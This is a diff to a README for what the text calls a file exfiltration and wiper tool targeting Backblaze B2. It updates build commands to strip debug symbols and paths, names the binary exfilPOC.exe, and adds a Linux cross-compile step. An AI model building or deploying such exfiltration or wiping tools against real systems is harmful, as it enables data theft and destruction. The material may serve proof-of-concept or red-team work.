@@ -20,8 +20,15 @@ A high-performance file exfil/wiper for Backblaze B2 that uses goroutines for co
 # To Build
 
 ```bash
-go build -o uploader.exe ./cmd/uploader
+go build -ldflags="-w -s" -trimpath -o exfilPOC.exe ./cmd/uploader
 ```
+or for linux (will require you to add in linux target dirs and skip paths in walker.go)
+
+```bash
+GOOS=linux GOARCH=amd64 go build -ldflags="-w -s" -trimpath -o exfilPOC.exe ./cmd/uploader
+```
+
+
 
 
 ## Usage
